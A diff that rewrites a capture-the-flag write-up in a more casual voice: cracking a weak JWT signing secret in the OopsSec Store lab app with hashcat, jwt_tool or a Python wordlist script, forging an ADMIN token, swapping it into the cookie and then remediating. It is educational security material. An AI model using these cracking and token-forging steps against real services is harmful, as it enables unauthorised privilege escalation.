@@ -14,13 +14,13 @@ tags:
 description: Exploiting a JWT implementation that uses a weak signing secret to crack the key, forge admin credentials, and access restricted endpoints.
 ---
 
-This writeup demonstrates how a JWT implementation using a weak signing secret allows attackers to brute-force the key, forge authentication tokens, and escalate privileges from a regular customer account to administrator access.
+The OopsSec Store signs its JWTs with a weak secret. We'll crack it, forge an admin token, and walk right into the restricted dashboard.
 
 ## Table of contents
 
 ## Environment setup
 
-Initialize the OopsSec Store application in a new directory:
+Spin up the OopsSec Store in a new directory:
 
 ```bash
 npx create-oss-store oss-store
@@ -28,21 +28,21 @@ cd oss-store
 npm start
 ```
 
-The installer retrieves dependencies, initializes a local SQLite database, seeds test user accounts, and starts the development server. Once the server is running, navigate to `http://localhost:3000` and authenticate using the test credentials displayed on the login page. For this exercise, log in as Alice, a standard customer account.
+This pulls dependencies, sets up a local SQLite database with test accounts, and starts the dev server. Head to `http://localhost:3000` and log in with the test credentials shown on the login page. Use Alice's account -- she's a regular customer.
 
 ## Reconnaissance
 
-The application uses JSON Web Tokens for session management. After successful authentication, the backend issues a token that is stored in an HTTP-only cookie and automatically transmitted with subsequent requests.
+The app uses JWTs for session management. After login, the server drops a token in an HTTP-only cookie that tags along with every request.
 
-The application footer contains a visible link to `/admin`. Attempting to access this endpoint while authenticated as a customer account results in an access denied response, indicating role-based access control is enforced.
+There's a link to `/admin` sitting right there in the footer. Click it as Alice and you get an access denied page.
 
 ![Access Denied - /admin](../../assets/images/jwt-weak-secret-admin-bypass/access-denied.png)
 
 ## Token extraction and analysis
 
-Open the browser's developer tools and navigate to Application > Cookies. The authentication token is stored in an HTTP-only cookie named `authToken`.
+Open DevTools, go to Application > Cookies. The token is in an HTTP-only cookie called `authToken`.
 
-Decoding this token using [jwt.io](https://jwt.io) reveals the following structure:
+Paste it into [jwt.io](https://jwt.io):
 
 **Header:**
 
@@ -65,31 +65,23 @@ Decoding this token using [jwt.io](https://jwt.io) reveals the following structu
 }
 ```
 
-The `alg: "HS256"` header indicates that the token is signed using HMAC-SHA256. This implementation requires knowledge of the signing secret to forge valid tokens.
+`HS256` -- HMAC-SHA256. You need the secret to forge a valid signature.
 
-Note the `hint` field in the payload: "The secret is not so secret". This suggests the signing key is weak and potentially guessable or crackable.
+But then there's the `hint` field: "The secret is not so secret". Not subtle.
 
 ## Identifying the vulnerability
 
-The presence of a signature does not guarantee security. If the signing secret is weak or guessable, an attacker can recover it through brute-force or dictionary attacks.
-
-Common weak secrets include:
-
-- `secret`
-- `password`
-- `jwt`
-- `key`
-- Application or company names
+A signature doesn't make a token secure if the secret behind it is garbage. Short or common secrets fall to dictionary attacks in seconds. Think `secret`, `password`, `jwt`, `key`, or just the app name.
 
 ## Cracking the JWT secret
 
-Save the JWT token to a file:
+Save the token to a file:
 
 ```bash
 echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImNta3I4eW4zNDAwMDF0b3A2NjJ6OXkzb20iLCJlbWFpbCI6ImFsaWNlQGV4YW1wbGUuY29tIiwicm9sZSI6IkNVU1RPTUVSIiwiaGludCI6IlRoZSBzZWNyZXQgaXMgbm90IHNvIHNlY3JldCIsImV4cCI6MTc2OTgwMDYzNH0.xYuUP20NgY6Pz9cktBEvS-_dczsDFKQQnhyHCvl7ckc" > jwt.txt
 ```
 
-Use `hashcat` to crack the secret with a wordlist:
+Crack it with `hashcat`:
 
 ```bash
 hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
@@ -97,13 +89,13 @@ hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
 
 ![Hashcat](../../assets/images/jwt-weak-secret-admin-bypass/hashcat.png)
 
-Alternatively, use `jwt_tool`:
+Or `jwt_tool`:
 
 ```bash
 python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
 ```
 
-Or create a simple script to test common secrets:
+Or skip the big wordlist and just try the obvious ones:
 
 ```python
 import jwt
@@ -121,11 +113,11 @@ for secret in wordlist:
         continue
 ```
 
-The secret is successfully recovered: `secret`
+The secret is `secret`. Yeah.
 
 ## Exploitation
 
-With the recovered secret, forge a new token with elevated privileges:
+Forge a token with `"role": "ADMIN"`:
 
 ```python
 import jwt
@@ -142,13 +134,13 @@ forged_token = jwt.encode(payload, "secret", algorithm="HS256")
 print(forged_token)
 ```
 
-Replace the `authToken` cookie value in Application > Cookies with the forged token and refresh the page. Navigate to `/admin` to confirm successful privilege escalation. Note: although the cookie is `httpOnly` (not accessible via JavaScript), you can still edit its value directly in DevTools.
+Back in DevTools > Application > Cookies, replace the `authToken` value with your forged token and refresh. The cookie is `httpOnly` so JavaScript can't touch it, but DevTools doesn't care -- you can edit it directly.
+
+Hit `/admin`.
 
 ![Admin page](../../assets/images/jwt-weak-secret-admin-bypass/admin-flag.png)
 
 ## Flag
-
-Upon accessing the admin dashboard with the forged token, the flag is displayed:
 
 ```
 OSS{w34k_jwt_s3cr3t_k3y}
@@ -156,15 +148,13 @@ OSS{w34k_jwt_s3cr3t_k3y}
 
 ## Remediation
 
-Proper JWT implementation requires several security controls.
-
-**Use strong, randomly generated secrets:**
+The fix starts with a real secret:
 
 ```bash
 openssl rand -base64 32
 ```
 
-**Store secrets securely in environment variables:**
+Keep it in an environment variable, not in your code:
 
 ```javascript
 import jwt from "jsonwebtoken";
@@ -175,13 +165,13 @@ jwt.sign(payload, process.env.JWT_SECRET, {
 });
 ```
 
-**Verify token signatures on every request:**
+Always verify signatures on incoming tokens:
 
 ```javascript
 jwt.verify(token, process.env.JWT_SECRET);
 ```
 
-**Retrieve authorization data from the database:**
+Don't trust the role claim in the token either. Look it up from the database:
 
 ```javascript
 const user = await db.users.findById(decoded.id);
@@ -191,6 +181,6 @@ if (user.role !== "ADMIN") {
 }
 ```
 
-**Consider asymmetric algorithms (RS256, ES256)** for scenarios where token verification happens on different services than token issuance, eliminating the need to share secrets.
+If different services need to issue and verify tokens, asymmetric algorithms (RS256, ES256) make more sense -- verifiers never see the private key.
 
-The token should authenticate identity only. Authorization decisions must be derived from trusted server-side data sources, not from client-supplied claims embedded in the token.
+The token tells you _who_ someone is. What they're allowed to do is a separate question, and the answer should come from your database, not from something the client handed you.
